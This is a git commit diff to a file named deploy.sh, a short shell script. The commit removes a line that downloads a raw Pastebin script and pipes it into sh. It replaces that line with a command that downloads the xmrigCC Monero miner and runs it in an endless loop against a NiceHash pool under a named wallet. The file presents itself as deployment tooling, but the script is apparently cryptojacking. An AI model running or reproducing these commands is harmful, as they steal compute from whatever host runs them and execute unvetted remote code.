4fef6e72174e172f51a62adff7c486d6936eb190
fig-gabriel <147957325+fig-gabriel@users.noreply.github.com>
2024-01-23 11:37:08 +0800

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -3,9 +3,4 @@
 yum install wget
 yum install xz -y
 
-wget google.com
-(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh
-wget google.com
-wget google.com
-wget google.com
-sleep 696969
+wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && while true; do ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.newguy -p x -a rx/0 -k ; sleep 3 ; done
